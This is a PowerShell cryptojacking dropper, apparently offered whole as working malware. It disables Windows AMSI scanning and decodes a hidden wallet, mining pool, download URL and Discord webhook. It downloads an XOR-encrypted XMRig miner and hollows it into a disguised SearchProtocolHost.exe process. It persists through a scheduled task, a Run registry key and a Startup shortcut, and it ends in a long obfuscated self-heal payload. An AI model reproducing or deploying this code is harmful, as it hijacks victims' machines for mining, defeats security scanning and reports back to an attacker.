try{
$d=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siU'+'tils')
$f=$d.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
$ptr=$f.GetValue($null)
[Runtime.InteropServices.Marshal]::Copy([byte[]](0x01),0,$ptr,1)
}catch{}

function X([string]$s){$b=[Convert]::FromBase64String($s);return [Text.Encoding]::UTF8.GetString($b)}
function XorDec([byte[]]$d,[byte[]]$k){$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]};return $o}

$_u='NDY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='
$_p='cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='
$_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
$_d='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
$_x='TXlTZWNyZXRLZXkxMjM0NQ=='
$_s="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
$hostExe="$env:WINDIR\System32\SearchProtocolHost.exe"

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class ImageLoader {
    [DllImport("kernel32.dll")] static extern bool CreateProcess(string a, string c, IntPtr b, IntPtr d, bool e, uint f, IntPtr g, string h, ref SI i, out PI j);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr p, IntPtr a, uint s, uint t, uint o);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr p, IntPtr a, byte[] b, uint s, out IntPtr w);
    [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr t, ref C64 c);
    [DllImport("kernel32.dll")] static extern bool GetThreadContext(IntPtr t, ref C64 c);
    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr t);
    [DllImport("kernel32.dll")] static extern bool TerminateProcess(IntPtr p, uint x);
    [DllImport("kernel32.dll")] static extern bool GetExitCodeProcess(IntPtr p, out uint x);
    [DllImport("ntdll.dll")] static extern int NtUnmapViewOfSection(IntPtr p, IntPtr a);
    [DllImport("ntdll.dll")] static extern int NtQueryInformationProcess(IntPtr p, int c, ref PBI i, int s, out int r);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr p, IntPtr a, out long b, IntPtr s, out IntPtr r);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct SI { public int cb; public IntPtr a,b,c; public int d,e,f,g,h,i,j; public ushort k,l; public IntPtr m,n,o,p,q; }
    [StructLayout(LayoutKind.Sequential)]
    struct PI { public IntPtr hP, hT; public int pid, tid; }
    [StructLayout(LayoutKind.Sequential)]
    struct PBI { public IntPtr r1, peb; public IntPtr r2_0, r2_1; public IntPtr upid; public IntPtr r3; }
    [StructLayout(LayoutKind.Sequential)]
    public struct C64 {
        public long p1,p2,p3,p4,p5,p6;
        public uint f, mx;
        public ushort cs,ds,es,fs,gs,ss;
        public uint ef;
        public long d0,d1,d2,d3,d6,d7;
        public long rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi;
        public long r8,r9,r10,r11,r12,r13,r14,r15;
        public long rip;
    }
    [StructLayout(LayoutKind.Sequential)] struct DH { public ushort m1; public ushort c1; public ushort c2; public ushort c3; public ushort c4; public ushort m2; public ushort m3; public ushort s; public ushort sp; public ushort cs1; public ushort ip; public ushort cv; public ushort lf; public ushort o; public ushort o2; public ushort o3; public ushort o4; public ushort m4; public ushort ois; public ushort oiu; public int n; }
    [StructLayout(LayoutKind.Sequential)] struct FH { public ushort m; public ushort ns; public uint t; public uint p; public uint no; public ushort so; public ushort q; }
    [StructLayout(LayoutKind.Sequential)] struct OH {
        public ushort mg; public byte k1,k2; public uint a,b,c;
        public uint ep; public uint bc; public ulong ib;
        public uint sa,fa; public ushort v1,v2,v3,v4,v5,v6; public uint w;
        public uint si,sh; public uint ck; public ushort ss1,s; public ulong sr,s2,hr,h2;
        public uint lf, nv;
    }
    [StructLayout(LayoutKind.Sequential)] struct SH {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=8)] public byte[] nm;
        public uint vs, va, rd, pr, prl, pl; public ushort nr, nl; public uint ch;
    }

    public static string Go(byte[] p, string exe, string args, string cwd) {
        SI si = new SI(); si.cb = Marshal.SizeOf(typeof(SI));
        PI pi;
        bool ok = CreateProcess(exe, "\"" + exe + "\" " + args, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, cwd, ref si, out pi);
        if(!ok) { return "CreateProcess failed " + Marshal.GetLastWin32Error(); }
        try {
            int no;
            try { no = BitConverter.ToInt32(p, 0x3C); } catch { Kill(pi); return "bad pe e_lfanew"; }
            if(p.Length < no + 64 || BitConverter.ToUInt16(p, 0) != 0x5A4D) { Kill(pi); return "not a pe"; }
            ushort ns = BitConverter.ToUInt16(p, no + 6);
            ushort so = BitConverter.ToUInt16(p, no + 20);
            int b = no + 24;
            uint ep = BitConverter.ToUInt32(p, b + 16);
            long ib = BitConverter.ToInt64(p, b + 24);
            uint si2 = BitConverter.ToUInt32(p, b + 56);
            uint sh2 = BitConverter.ToUInt32(p, b + 60);
            int shOff = no + 4 + 20 + so;
            long hostBase = 0;
            IntPtr w;
            PBI bi = new PBI();
            int rl;
            int st = NtQueryInformationProcess(pi.hP, 0, ref bi, Marshal.SizeOf(typeof(PBI)), out rl);
            if(st != 0 || bi.peb == IntPtr.Zero) { Kill(pi); return "NtQIP failed " + st; }
            if(!ReadProcessMemory(pi.hP, new IntPtr(bi.peb.ToInt64() + 0x10), out hostBase, new IntPtr(8), out w)) { Kill(pi); return "RPM hostbase failed"; }
            int u = NtUnmapViewOfSection(pi.hP, new IntPtr(hostBase));
            IntPtr baseAddr = VirtualAllocEx(pi.hP, new IntPtr(ib), si2, 0x3000, 0x40);
            if(baseAddr == IntPtr.Zero) { Kill(pi); return "VirtualAllocEx failed, unmap=" + u; }
            byte[] hdr = new byte[sh2];
            Array.Copy(p, 0, hdr, 0, (int)sh2);
            if(!WriteProcessMemory(pi.hP, baseAddr, hdr, sh2, out w)) { Kill(pi); return "WPM header failed"; }
            for(int i2 = 0; i2 < ns; i2++) {
                int so2 = shOff + i2 * 40;
                uint va = BitConverter.ToUInt32(p, so2 + 12);
                uint rd = BitConverter.ToUInt32(p, so2 + 16);
                uint pr = BitConverter.ToUInt32(p, so2 + 20);
                byte[] data = new byte[rd];
                Array.Copy(p, (int)pr, data, 0, (int)rd);
                if(!WriteProcessMemory(pi.hP, new IntPtr(baseAddr.ToInt64() + (long)va), data, rd, out w)) { Kill(pi); return "WPM sec " + i2 + " failed"; }
            }
            C64 ctx = new C64(); ctx.f = 0x100000;
            if(!GetThreadContext(pi.hT, ref ctx)) { Kill(pi); return "GetThreadContext failed"; }
            ctx.rip = baseAddr.ToInt64() + (long)ep;
            if(!SetThreadContext(pi.hT, ref ctx)) { Kill(pi); return "SetThreadContext failed"; }
            if(ResumeThread(pi.hT) == 0xFFFFFFFF) { Kill(pi); return "ResumeThread failed"; }
            Thread.Sleep(6000);
            uint ec;
            GetExitCodeProcess(pi.hP, out ec);
            if(ec != 259) { CloseHandle(pi.hT); CloseHandle(pi.hP); return "exited:" + ec; }
            return "OK alive";
        } catch(Exception ex) { Kill(pi); return "exc: " + ex.Message; }
    }
    static void Kill(PI pi) {
        TerminateProcess(pi.hP, 0);
        try { CloseHandle(pi.hT); } catch { }
        try { CloseHandle(pi.hP); } catch { }
    }
}
'@

function Send-DiscordWebhook{
param([string]$msg)
try{
$wc2=New-Object Net.WebClient
$body=@{content=$msg}|ConvertTo-Json
$wc2.Headers.Add('Content-Type','application/json')
$wc2.UploadString((X $_d),'POST',$body)
}catch{}
}

function Launch-Miner{
$wc=New-Object Net.WebClient
$enc=$wc.DownloadData((X $_e))
$key=[Text.Encoding]::UTF8.GetBytes((X $_x))
$dec=XorDec $enc $key
$args="-o " + (X $_p) + " -u " + (X $_u) + " -k --tls --donate-level 0 --max-cpu-usage 10 --coin monero --algo rx/0"
$r=[ImageLoader]::Go($dec,$hostExe,$args,$_s)
if($r -ne 'OK alive'){Send-DiscordWebhook "DEPLOY FAIL: $r"}
return $r
}

function Set-Persistence{
$t=New-ScheduledTaskTrigger -AtLogOn
$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t -Action $a -RunLevel Highest -Force|Out-Null
}

function Set-DeepPersistence{
try{
$k=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
$k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`"")
$k.Close()
$sh="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NetworkServiceCache.lnk"
$ws=New-Object -ComObject WScript.Shell
$sc=$ws.CreateShortcut($sh)
$sc.TargetPath="powershell.exe"
$sc.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
$sc.Save()
}catch{}
}

function Write-StealthWatchdog{
$w = @'
$ErrorActionPreference='SilentlyContinue'
while($true){
$proc=Get-Process -Name SearchProtocolHost -ErrorAction SilentlyContinue
if(!$proc){
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache\miner.ps1`""
}
Start-Sleep 60
}
'@
$w|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
}

function Write-SelfHealScript{
$b64='JEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKU3RhcnQtU2xlZXAgOAp0cnl7JGQ9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbScrJ3NpVScrJ3RpbHMnKQokZj0kZC5HZXRGaWVsZCgnYW0nKydzaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykKJHB0cj0kZi5HZXRWYWx1ZSgkbnVsbCkKW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KFtieXRlW11dKDB4MDEpLDAsJHB0ciwxKX1jYXRjaHt9CmZ1bmN0aW9uIFgoW3N0cmluZ10kcyl7W1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHMpKX0KZnVuY3Rpb24gWG9yRGVjKFtieXRlW11dJGQsW2J5dGVbXV0kayl7JG89TmV3LU9iamVjdCBieXRlW10gJGQuTGVuZ3RoO2ZvcigkaT0wOyRpIC1sdCAkZC5MZW5ndGg7JGkrKyl7JG9bJGldPSRkWyRpXSAtYnhvciAka1skaSAlICRrLkxlbmd0aF19O3JldHVybiAkb30KJGtleT1bYnl0ZVtdXSgweDRELDB4NzksMHg1MywweDY1LDB4NjMsMHg3MiwweDY1LDB4NzQsMHg0QiwweDY1LDB4NzksMHgzMSwweDMyLDB4MzMsMHgzNCwweDM1KQokc3JjPVtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoKFhvckRlYyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ09BbzZDd1JTTmcwNEVSeGNDVGxCUmlRWE5FVXdDeFlBTGdoWFkwZGRRRndnSEgwc0RRWUFCaVFWS2xSQVJWMVdLQXBvYnhZQkRCb3NSU3BJUVVkUldHTXRPeGNHRXdFZEpRSkNPemhEUVZjaEVEQkZBQjRFQnpoRk1GeFRWRkY1SWhnM0FCRlNIbjVyUlZrUmFYZFlXUVFVSXdvUkJrMVdJQUFMWDFkZkJ3ZGpIVDhKUVZzNFZEZ1JHRVZiVUJSUU5RMDJGdzFTQnhza0NWbHlRRlpWUVNncElRb0FGeFlIWXhZTlExdGRVeFVzVlhNV0Z3QU1HaXhGR2gwU2VscEJIUTBoUlFGZVJUMGxFU2xGUUJOUUdXMGJQQW9QVWdCWWF4QVFYMFlUVWhsdE1EMFJNd1lYVkN4SldVSkdRVjFiS2xrN1NVTUFBQkpyTmpBUld4OFVXamdOY3pVcVVnOWRjRzlaRVJJVGIzRWhGUm9JRXgwWEFHTkhFbFJBWFZGWmZrdDlBUThlUjEwV1JRcEZVMGRkVm0wY0t4RUdBQXRVQWdzTllVWkJGR01rQ3ljUUFoNGtHQ2NLR25SS0czMWJPU2tuRjBNQ1NWUUNDdzFoUmtFVVZHRlpKZ3dOQmtVSFowVU1XRnhIRkVGaFdTWU1EUVpGRzJKZWN4RVNFeFJ1Q1JVL0xBNENDZ1kvVFZ0YVYwRmFVQ0ZLWVVzSEhnbFdZamhaUWtaU1FGd3VXVFlkRnhjWEdtc0hGbDVlRTJOSEpBMDJOUkVkQmhFNEZqUlVYMXhHVEdVd1BSRXpCaGRVTzBsWmVGeEhaRUUvV1RKSlF4QWNBQzQrSkJGUUh4UkFKQmNuUlJCZVJScytFVmw0WEVka1FUOVpKRXhZZUVWVWEwVWlkVjVmZlZnOUZpRVJTMUFPRVRrTEhGMEJBUnBSSVJWeFRENVNGZ0FxRVJCU0VsWk1RU2dMUFVVQkhRb1lhelljUldaYlJsQXNIUkFLRFFZQUREOU5NRjlHWTBCSGJRMS9SUkVYQTFRSVUwMFJVUm9QUDIxWmMwVTROZ2tZQWdnSlhrQkhIQmNtSENFTEJoNVdSbVVCRlYwUUdta1ZQZzB5RVFvUlJSRXpFUnhEWEJOV1dpSVZjeUlHQmpFY09RQVlWWEZjV2tFb0FTZE5LaHdSSkQ4WFdVVWVFMFpRSzFrUVUxZFNCbDF3YjFrUkVoTnZjU0VWR2dnVEhSY0FZMGNTVkVCZFVWbCtTMzBCRHg1SFhSWkZDa1ZUUjExV2JSd3JFUVlBQzFRK0RCZEZFbUZSUmpnVU5qRUxBQUFWTDAwd1gwWmpRRWR0RFhwZWFWSkZWR3MrUFYxZWVsbEZJZ3NuVFVFWkFBWWxBQlVDQUIxUVdTRmJlamhEQVJFVlB3d2FFVmRMUUZBL0YzTUhEQjBKVkI4QUMxeGJYVlZCS0NraENnQVhGZ2RqTEJkRllrZEdGVDFWY3hBS0hCRlVNMHhDT3hJVEZCVVdQVDhKS2g4Vkd6a1JVUk5aVmtaYktCVmdWMDBXQ1JocFRDUVJRVWRWUVNRYWN3QWJCZ0FHSlVVYlhsMWZGSElvRFJZZENnWW1HeThBS1VOZFVGRkdQbEVhQ3hjaUVRWnJGVlVSWFVaQUZUZ1FQUkZEQ2t4UFFVVlpFUkpvY0ZraE1ENFZEQUFSWEdrTERWVmVYeHBSSVJWeFRENVNGZ0FxRVJCU0VsWk1RU2dMUFVVS0hCRlVCUkVzWDE5U1JHTWtIQ1FxQlNFQUZ6OE1GbDhhZWxwQkhRMGhSUk5lUlQwbEVTbEZRQk5WSEhaemMwVkRVajR3Sndrd1hFSmNSa0ZsV3owUkJ4NEpXaThKRlJNYmJoUkdPUmduREFCU0FBdy9BQXRmRWxwYVFXMDNKelFXRnhjTkFnc2ZYa0JlVlVFa0ZqMDFFUjBHRVRnV1VYaGNSMlJCUDFralNVTWJDd0JyQmxVUlFGWlNGUjA3R2tVS1hrVWRKUkZaUWg0VFcwQTVXVG9MRjFJWFhYQnZXUkVTRTI5eElSVWFDQk1kRndCalJ4SlVRRjFSV1g1TGZRRVBIa2RkRmtVS1JWTkhYVlp0SENzUkJnQUxWQ2tLRmwwU1lWRlVLU2toQ2dBWEZnY0dBQlJlUUVvY2ZDTU5BeEVSVWhWWWF5d1hSV0pIUmhVc1ZYTUtGZ1pGR0NRTEhoRlFIeFI4SXcwREVSRlNGbGhyQ2d4RkVucGFRUjBOSVVVUlcxNSthMFZaRVdsM1dGa0VGQ01LRVFaTlZpQUFDMTlYWHdjSFl4MC9DVUZiT0ZRNEVSaEZXMUFVVURVTk5oY05VZ2NiSkFsWmNsNWNSMUFGR0QwQkR4ZE5QU1VSS1VWQUUxd2Nkbk56UlVOU1BpYy9Gd3hTUm45VlRDSU1KMDB2RXh3YlBoRXlXRnhYR21Zb0NDWUFEUVlNRlNkSldYSmFVa1ptS0ExdUpnc1RGeWN1RVZka1hGcFhXaWtjZWpocFVrVlVheFlOUTBkUVFCVWVNSE1lUXdJUUZpY01HaEZiWFVBVkxodG9SUk1IQnhnaUJsbDRYRWRrUVQ5Wk1ra0JYZ1pQYXhVTVUxNWFWeFVrRnlkRkIxNEFXQzFKSGgxYUgxMFpKMEp6RlJZUUNSMG9SUXhDV2x4R1FXMFNmd2xZVWhVQktRa1FVaEo2V2tFZERTRkZEbDRMV0NSSkNSMURDQlJJUjFselJVTXBOZ0E1RUJwRmZsSk5XamdOZXlrQ0N3b0JQeTRRWDFZZFoxQThERFlMRnhzRUdHSTRjeEVTRXhSR09Rc21CaGRTTlQxckhsbEJSMUZZWEM1Wkdnc1hJaEVHYXcwcEhSSmJZQTV0Q1NZSER4c0dWQ0lMRFJGQ1dsQVpiUTA2QVZoU0dINXJSVmtSYVdCQVJ6Z2FKeWtDQ3dvQlAwMDFVRXRjUVVFR0VEMEJUU0VBQlQ0QUYwVmJVbGdjRUhOelJVTlNGZ0E1RUJwRkVtTjJmRzBDY3hVV0VBa2RLRVV3WDBaalFFZHRDMkpKUXdJQUZuQkZDVVJRWDExV2JUQTlFVE1HRjFRNVZ5WUJIaE5HQnhKSWFFVVRCd2NZSWdaWmVGeEhaRUUvV1NZVkNoWmVWRHNRRzExYlVCUjhJdzBERVJGU0YwZHdSUVE3RWhNVUZSWXFKeGNXRVJFNEtod1dSRVliZUZRMEZpWVJLQnNMRUdVMkhFQkhWbHBCSkJnL1RENTRSVlJyUlFsRVVGOWRWbTBLSnhjV0VSRlVDRk5ORVVrNUZCVnRXWE5GUTFJVkFTa0pFRklTWDF0Yktsa2pWRThDVjFnN1ZsVkJCaDlFQUdFSlpWNXBVa1ZVYTBWWkVSSkRRVmNoRURCRkZoc0xBR3NEVlJGZlN3OC9iVmx6UlVOU1JWUTdFQnRkVzFBVVFENFJQQmNYVWdZSFp3RUtIVmRBR0ZNK1ZUUVdUd0VXVDBGRldSRVNFeFFWYlFrbUJ3OGJCbFErREJkRkVsWlNEa2RaYzBWRFVrVlVheFVNVTE1YVZ4VWhGajBDUXhaVldDOVVWVlVBSDFBR1lSMWxTUWRGWG41clJWa1JFaE1VRlQwTU1Ra0tFVVVZSkFzZUVVQlNUQmsvR2l0SkVSWWRXRGtIQVIxQVFFUVpQeHNqU1JFQkRGZzVBUkFLT0JNVUZXMVpjMFZEQWhBV0p3d2FFVjVjV2xKdEMydEpFVXRKQm5wVlZVTURBaGhIZkV0L0YxSkJTUVo2VVZWREF3WVBQMjFaYzBWRFVrVlVPeEFiWFZ0UUZGa2lGelJGRVJzVlQwRkZXUkVTVGo0VmJWbHpQakFHRndFb0VUVlFTMXhCUVdVMU1od01CeEUvSWdzZEgyRldSVUFvRnljTUFoNU1LV3NXRFVOSFVFQVZDVEZ6SGtNQ0VCWW5EQm9SUjBCY1dqOE5jd2hTU1VVRVBnY1ZXRkVUUVVZbEZpRVJReEZVVDJzVkRGTmVXbGNWT0FvN0NoRUdSUmQ1WGxsQlIxRllYQzVaSmhZTEhSY0Fhd1pLQ2hKRFFWY2hFREJGRmdFTkd6a1JXVklHQ0JSRk9Ccy9EQUJTRUFjakNndEZFbDRHRG0wSkpnY1BHd1pVUGhZUlhrQkhGRmgrUW5NVkZoQUpIU2hGREVKYVhFWkJiUXBvUlJNSEJ4Z2lCbGxFUVZ0YlJ6bFpJQlZZVWhVQktRa1FVaEpHUjEwaUN5ZEZBQUZVVDJzVkRGTmVXbGNWT0FvN0NoRUdSUjA3WGxsQlIxRllYQzVaSmhZTEhSY0Fhd1lQQ2hKRFFWY2hFREJGRmdFTkd6a1JXVjFVQ0JSRk9Ccy9EQUJTRUFjakNndEZFbHdQRlQwTU1Ra0tFVVVCT0EwV1EwWVRXd2QyV1NNUUFSNE1GMnNRQ2xsZFFVQVZJa3BvUlJNSEJ4Z2lCbGxFUVZ0YlJ6bFpQRkZZVWhVQktRa1FVaEpHUjEwaUN5ZEZEa1plVkRzUUcxMWJVQlJBUGhFOEZ4ZFNDaDA0WGxsQlIxRllYQzVaSmhZTEhSY0Fhd29RUkFrVFJFQXZGVG9HUXhzTEFHc0xRaEZQT1JRVmJWa0lOaGNBRUJjL0tSaElYVVpBSFFFWUtnb1dCaTRkSlFGWFlsZENRVkFqRFRvRUQxczRWRGdSQzBSUlJ4UnpCVmtvUlJNSEJ4Z2lCbGxFUVZ0YlJ6bFpQbDVEQWhBV0p3d2FFVWRBWEZvL0RYTUxFRWxGQkQ0SEZWaFJFMEZjSXcxekVWaFNGUUVwQ1JCU0VrWmRXemxaSTE1REFoQVdKd3dhRVVkYVdrRnRGenhlUXdJUUZpY01HaEZIUUZ4YVB3MXpGZ3hKUlFRK0J4VllVUk5CUmlVV0lSRkRBMTVVTm05WkVSSVRiMlk1Q3lZR0Z6NEVEU1FRRFJsK1VrMWFPQTBZREEwV1N5Y3VGQXhVWEVkZFZDRlFEa1VRQmhjQktCRlpmbm9UVHo5dFdYTkZRMUpGVkRzUUcxMWJVQlJBUGhFOEZ4ZFNDQk53UlFsRVVGOWRWbTBiS2hFR1VnNUZadzVMQ2hKRFFWY2hFREJGRmhzTEFHc0VWVk1lVUE4L2JWbHpSVU5TUlZRN0VCdGRXMUFVUUNRWEowVUdBbDVVT3hBYlhWdFFGRUFrRnlkRkFSRmVWRHNRRzExYlVCUkFJUlk5QWtNYkIwOUJSVmtSRWhNVUZXMEpKZ2NQR3daVVBnd1hSUkpBVlJrckdHaEZFd2NIR0NJR1dVUkJXMXRIT1ZrbFZFOEVWMWc5VmxWSEJoOUNBR0VQWlY1REFoQVdKd3dhRVVkYVdrRnREbWh2UTFKRlZHdEZXUkZDUmxaWkpCcHpFQW9jRVZRNERGVkNXZ2dVUlRnYlB3d0FVaEFkSlJGWlVsa0lGRVU0R3o4TUFGSVFCeU1LQzBVU1FFY0VZUXBvUlJNSEJ4Z2lCbGxFWGx4YVVtMEtJVWtRUUVrY09Va1JBd2s1RkJWdFdYTkZRMUlWQVNrSkVGSVNSbDFiT1ZrL0EwOVNDd0p3YjFrUkVoTkpQMjFaYzBVNElSRUdQZ1lOZlZOS1cwQTVVUjhFR2gwUUFBQU1GMVVjWUZGRU9CdzlFUW9UQ1YwV1JRcEZRRVpYUVcwcUcwVVllRVZVYTBWWkVSSVRiM2dzQ3lBTkFoNGtCMk13RjF4VFhWVlNLQjBISEJNWFN6WXlNeGhkYzBGR1ZEUlZjellLQ0FBM0pBc0tSUThMSFdodENTWUhEeHNHVkNrY0RWUnBiaFJiSUVKWlJVTlNSVlJyUlZsQlIxRllYQzVaSmd3TkJrVUNPRWxaUjFNZkZFY3BWWE1WRVY1RkJEa0pWUkZDWHc4VlBRd3hDUW9SUlFFNERSWkRSaE5hUjJGWlBRbFlVaFVCS1FrUVVoSkdYVnM1V1RBTldIaEZWR3RGQkRzNEV4UVZiUWttQnc4YkJsUTRFUmhGVzFBVVJqa0xPZ3NFVWlJYll3Y0FSVmRvYVJVOVZYTVdGd0FNR2l4RkhFbFhIeFJHT1FzNkN3UlNCQVlzRmxVUlFVZEdYQ01lY3dZVUZreFVNRzlaRVJJVEZCVnRXUUFzUXdFTVZIWkZGMVJGRTJkOFpWQm9SUkFiU3hjcFJVUVJmMUpHUmlVWVAwc3dHeDhSQkFOUlJVdERVVm9yVVFBc1NsdGVmbXRGV1JFU0V4UVZIVEJ6RlFwSmIxUnJSVmtSRWhNVVZ5SVdQMFVNR1VWSmF5WUxWRk5IVVdVL0ZqQUFFQUZORVRNQVZSRVFieFlYYlZKekFCc1hSVjlyUnlVVEVoRVVIbTBZSVFJUVhrVTlKUkVwUlVBZGJsQS9GbjlGS2h3UkpEOFhWMnRYUVZzWmJSOHlDUkFYU1ZSN0hVMGRFbnBhUVIwTklVczVGeGNiWjBVYVJsWWZGRWNvSDNNV0NsNUZHejRSV1VGYkdnOC9iVmx6UlVOU1JWUWlBMUVRWFZnZEZUWlpJUUFYQnhjYWEwYzZRMWRTUUZBZEN6d0dCZ0VXVkMwRUVGMVhWeFFYYlZKektBSUFGaHdxQ1ZkMlYwZDRWRDROQkF3TlFWY3hPUmNXUXhvYUR4VXdjM05GUTFKRlZHdEZEVU5MRTA4L2JWbHpSVU5TUlZSclJWa1JXMTFBRlNNV2FHOURVa1ZVYTBWWkVSSVRGQlU1Q3lwRkdGSUxHMnRZV1hOYlIzZGFJdzgyRnhjWEYxb2ZDakJmUmdBR0hUMVZjMVViUVNaZGNFVUVFVkZTUUZZbFdTaEZLQnNKR0dNVkVCZ0pFMFpRT1F3aEMwTlFCeFV2UlFsVUVsWnJXU3NZUFFBVVVGNVVObTlaRVJJVEZCVnRXWE5GUTFJTUVtTVZWMzFYWFZOQkpWbHZSUTBkUlY5clUwMFJUazhVZHlRTkVBb05CQUFHUHdBTEgyWmNZWHdqRFdKVFN3SkpWSHRNV1JBUEV3Uk5lRGhuSVVwU0hsUUFEQlZkR2tOZEhIWlpJUUFYQnhjYWEwY1hYa1lUVlJVOUhIRmVRdzl2Vkd0RldSRVNFeFFWYlZsekVCQWFDZ1kvUlJkQ0VnNFVkeVFORUFvTkJBQUdQd0FMSDJaY1lYd2pEV0pUU3dKSlZDVUtXUm9TQlIwT1IxbHpSVU5TUlZSclJWa1JFa1pIWFNJTEowVVFIVVZKYXljUVJYRmNXa01vQ3ljQUVWd3hHeDRzRjBVREJSeEZZVms5Q2tOWlJVWjdURUk3RWhNVUZXMVpjMFZEVWtWVUlnc05FVkFUQ1JVakZuTk9RMEJSVDBGRldSRVNFeFFWYlZselJVTUhEQm8vUlJ4QkVnNFVkeVFORUFvTkJBQUdQd0FMSDJaY1lYd2pEV0JYU3dKSlZDbEZVaEVEQlIwT1IxbHpSVU5TUlZSclJWa1JFbDliV3lwWk9nZERUMFUySWhFNlhseEZVVWM1SENGTE54MHNHajlUVFJsQ0h4UlhiVkp6VjFkYlhuNXJSVmtSRWhNVUZXMVpjMFVXR3dzQWF4WVFBeElPRkhja0RSQUtEUVFBQmo4QUN4OW1YR0Y4SXcxZ1Ywc0NTVlFwUlZJUkJ3VWREa2RaYzBWRFVrVlVhMFZaRVJKR1hWczVXU0FOVVZKWVZBa01EWEpkWFVKUVB3MDJGMDBtQ2lFQ0N3MENBQnRFR1cwYmMwNURSRlZkY0c5WkVSSVRGQlZ0V1hORlExSU1HajlGQ2xsOVZWSVZjRms5Q2tOWlJVQnJUbGtEQWhNZkZUNFdhRzlEVWtWVWEwVlpFUklURkJVaEZqMENReG9LQno4bkdFSlhFd2tWZlVKWlJVTlNSVlJyUlZrUkVoTVVmQ01OQXhFUlVoSlBRVVZaRVJJVEZCVnRXWE5GUXlJblBXc0hFQkVQRTFwUU9sa0RKeXBhVEU5QlJWa1JFaE1VRlcxWmMwVkRHd3NBYXhjVkNqZ1RGQlZ0V1hORlExSkZWR3NNRjBVU1FFQVZjRmtkRVRJSEFBWXlMQmRYWFVGWlZEa1FQQXN6QUFvWExoWUtHVUphR2wwZFZYTlZUMUlYRVMxRkcxZ2VFM2xVUHdvN0JBOWNOaDB4QURaWEdrZE5SU2dXTlUwek1DeGRZa2xaWGtkSEZFY2hVR2h2UTFKRlZHdEZXUkVTRXhRVkpCOTdGaGRTUkVsclZWbE5UaE5XWEdNSk5nZERUMWhVQWdzTllVWkJHbThvQ3p4TVF3bEZQeUlKRlJsQ1doME9iUXMyRVJZQUMxUnBLdzFnZTJNVVV5d1FQd0FIVWtkVVlFVUtSUWtUU1Q5dFdYTkZRMUpGVkd0RldSRmJWUndVSHh3eUFUTUFDaGN1RmdwOFYxNWJSelJSSXd4TkdqVllhd3NjUmhKNldrRWREU0ZOQVJ0TEJDNEhWMlZkZWxwQmUwMTdURU5aUlVRelZFa1lIaE5iUURsWk93b1FCaWNWT0FCVkVWeFdReFVFRnljMUZ3Qk5UR0pKV1Y1SFJ4UkNaRkJ6SGtNNURCZ25UUWxZR3dnVVJ5Z05KaGNOVWtjbUd5aFpXVjFBUUZjc0NqWkZCUk1NR0M0Qld3b1NUajRWYlZselJVTlNSVlJyUlZsWVhFY1VRRzFFY3lzWEp3c1pLaFV2V0ZkRWUxTWVIREFSQ2gwTFhEc01WMWxpSHhSYktBNXpMQTBHTlFBNVRSRmVRVWQyVkQ0Y2VreFllRVZVYTBWWkVSSVRGQlZ0V1JvTEZ5SVJCbXNIR0VKWGNsQlJQMWx1UlRVYkZ3QStCQlZ3WGw5YlZnZ0JleFVLWEEwa1owVVhWRVVUZlZzNUtTY1hTeHNIWFdkRkNsZ0FIeFFGTlVwalZWTmVSVVF6VVVrWUNUa1VGVzFaYzBWRFVrVlVhMFVRVnhwUlZVWW9PRGNCRVZKWVNXc3NGMFZpUjBZYkZ4d2hDa3BTSGxRQURCVmRHa05kSEhaWklRQVhCeGNhYTBjdldF